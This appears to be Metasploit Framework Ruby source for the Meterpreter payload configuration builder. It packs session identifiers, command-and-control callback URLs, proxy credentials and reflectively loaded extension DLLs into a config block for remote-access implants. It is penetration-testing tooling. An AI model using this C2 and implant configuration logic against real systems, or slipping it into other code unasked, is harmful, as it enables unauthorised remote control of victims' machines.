# -*- coding: binary -*-
require 'rex/socket/x509_certificate'
require 'rex/post/meterpreter/extension_mapper'
require 'rex/post/meterpreter/packet'
require 'msf/core/payload/malleable_c2'
require 'rex/payloads/meterpreter/uri_checksum'
require 'securerandom'

class Rex::Payloads::Meterpreter::Config

  include Msf::Payload::UUID::Options
  include Msf::ReflectiveDLLLoader
  include Rex::Payloads::Meterpreter::UriChecksum

  MET = Rex::Post::Meterpreter

  def initialize(opts={})
    @opts = opts
    if opts[:ascii_str] == true
      @to_str = self.method(:to_ascii)
    else
      @to_str = self.method(:to_wchar_t)
    end
  end

  def to_b
    config_block
  end

private

  def is_x86?
    @opts[:arch] == ARCH_X86
  end

  def to_str(item, size)

    if item.size >= size  # ">=" instead of only ">", because we need space for a terminating null byte (for string handling in C)
      raise Msf::PayloadItemSizeError.new(item, size - 1)
    end
    @to_str.call(item, size)
  end

  def to_wchar_t(item, size)
    to_ascii(item, size).unpack('C*').pack('v*')
  end

  def to_ascii(item, size)
    item.to_s.ljust(size, "\x00")
  end

  def add_session_tlv(tlv, opts)
    uuid = opts[:uuid].to_raw
    exit_func = Msf::Payload::Windows.exit_types[opts[:exitfunk]]

    # if no session guid is given then we'll just pass the blank
    # guid through. this is important for stageless payloads
    if opts[:stageless] == true || opts[:null_session_guid] == true
      session_guid = "\x00" * 16
    else
      session_guid = [SecureRandom.uuid.gsub('-', '')].pack('H*')
    end

    tlv.add_tlv(MET::TLV_TYPE_EXITFUNC, exit_func) if exit_func
    tlv.add_tlv(MET::TLV_TYPE_SESSION_EXPIRY, opts[:expiration])
    tlv.add_tlv(MET::TLV_TYPE_UUID, uuid)
    tlv.add_tlv(MET::TLV_TYPE_SESSION_GUID, session_guid)

    if opts[:debug_build] && opts[:log_path]
      tlv.add_tlv(MET::TLV_TYPE_DEBUG_LOG, opts[:log_path])
    end

    if opts[:flags] && opts[:flags] != 0
      tlv.add_tlv(MET::TLV_TYPE_SESSION_FLAGS, opts[:flags])
    end
  end

  def add_c2_tlv(tlv, opts)
    lhost = opts[:lhost]
    if lhost && opts[:scheme].start_with?('http') && Rex::Socket.is_ipv6?(lhost)
      lhost = "[#{lhost}]"
    end

    unless (opts[:c2_profile] || '').empty?
      parser = Msf::Payload::MalleableC2::Parser.new
      profile = parser.parse(opts[:c2_profile])
      c2_tlv = profile.to_tlv
    else
      c2_tlv = MET::GroupTlv.new(MET::TLV_TYPE_C2)

      c2_tlv.add_tlv(MET::TLV_TYPE_C2_UA, opts[:ua]) unless (opts[:ua] || '').empty?
    end

    c2_tlv.add_tlv(MET::TLV_TYPE_C2_COMM_TIMEOUT, opts[:comm_timeout])
    c2_tlv.add_tlv(MET::TLV_TYPE_C2_RETRY_TOTAL, opts[:retry_total])
    c2_tlv.add_tlv(MET::TLV_TYPE_C2_RETRY_WAIT, opts[:retry_wait])

    # Only build a C2 URL when we actually have a host. Staged payloads
    # inherit the stager's socket and carry no host; guard so a nil lhost
    # cannot reach Rex::Socket.to_authority (which requires a String).
    if lhost && !lhost.to_s.empty?
      url = "#{opts[:scheme]}://#{Rex::Socket.to_authority(lhost, opts[:lport])}"
      url << "/#{opts[:uri].delete_prefix('/').delete_suffix('/')}/" if opts[:uri]
      url << "?#{opts[:scope_id]}" if opts[:scope_id]

      c2_tlv.add_tlv(MET::TLV_TYPE_C2_URL, url)

      # if the transport URI is for a HTTP payload we need to add a stack
      # of other stuff that can only be set in MSF, not in the C2 profile
      if url.start_with?('http')
        proxy_url = ''
        if opts[:proxy_host] && opts[:proxy_port]
          prefix = 'http://'
          prefix = 'socks=' if opts[:proxy_type].to_s.downcase == 'socks'
          proxy_url = "#{prefix}#{opts[:proxy_host]}:#{opts[:proxy_port]}"
        end

        c2_tlv.add_tlv(MET::TLV_TYPE_C2_PROXY_URL, proxy_url) unless (proxy_url || '').empty?
        c2_tlv.add_tlv(MET::TLV_TYPE_C2_PROXY_USER, opts[:proxy_user]) unless (opts[:proxy_user] || '').empty?
        c2_tlv.add_tlv(MET::TLV_TYPE_C2_PROXY_PASS, opts[:proxy_pass]) unless (opts[:proxy_pass] || '').empty?

        c2_tlv.add_tlv(MET::TLV_TYPE_C2_CERT_HASH, opts[:ssl_cert_hash]) unless (opts[:ssl_cert_hash] || '').empty?
        c2_tlv.add_tlv(MET::TLV_TYPE_C2_HEADERS, opts[:custom_headers]) unless (opts[:custom_headers] || '').empty?
      end
    end

    tlv.tlvs << c2_tlv
  end

  def add_extension_tlv(tlv, ext_name, ext_init_path, file_extension, debug_build: false)
    ext_name = ext_name.strip.downcase
    # Windows DLLs go through Reflective DLL Injection prep; non-PE
    # runtimes (jar/py/php) ship the file as-is in TLV_TYPE_DATA.
    if file_extension.to_s.end_with?('.dll')
      ext_path = MetasploitPayloads.meterpreter_path("ext_server_#{ext_name}",
                                                     file_extension, debug: debug_build)
      ext, _ = load_rdi_dll(ext_path)
    else
      ext = MetasploitPayloads.read('meterpreter', "ext_server_#{ext_name}.#{file_extension}".downcase)
    end

    ext_tlv = MET::GroupTlv.new(MET::TLV_TYPE_EXTENSION)
    ext_tlv.add_tlv(MET::TLV_TYPE_DATA, ext)
    unless (ext_init_path || '').empty?
      ext_id = Rex::Post::Meterpreter::ExtensionMapper.get_extension_id(ext_name)
      init_data = ::File.read(ext_init_path, mode: 'rb')
      ext_tlv.add_tlv(MET::TLV_TYPE_STRING, init_data) unless (init_data || '').empty?
      ext_tlv.add_tlv(MET::TLV_META_TYPE_UINT, ext_id)
    end
    tlv.tlvs << ext_tlv
  end

  def config_block
    # start with the session information
    config_packet = MET::Packet.create_config()
    add_session_tlv(config_packet, @opts)

    # then load up the transport configurations
    (@opts[:transports] || []).each do |t|
      add_c2_tlv(config_packet, t)
    end

    # Each runtime tells us which on-disk extension file matches the
    # payload (e.g. 'x86.dll', 'x64.dll', 'py', 'php', 'jar'); skip the
    # extension TLV emission when the caller didn't supply one.
    file_extension = @opts[:ext_format]

    @opts[:extensions] = [] if @opts[:extensions].blank?
    prev_length = @opts[:extensions].length
    @opts[:extensions] = @opts[:extensions].select {|ext_name| ext_name.index('stdapi_') != 0}
    if prev_length != @opts[:extensions].length
      raise Msf::OptionValidateError.new(
        {
          'EXTENSIONS' => 'The extensions starting with stdapi_* are currently not supported.'
        },
        message: "The extensions starting with stdapi_* are currently not supported."
      )
    end

    ext_inits = (@opts[:ext_init] || '').split(':').map{|v| v.split(',')}.to_h{|l| l}

    if file_extension
      (@opts[:extensions] || []).each do |e|
        add_extension_tlv(config_packet, e, ext_inits[e], file_extension, debug_build: @opts[:debug_build])
      end
    end

    config_packet.to_r
  end
end
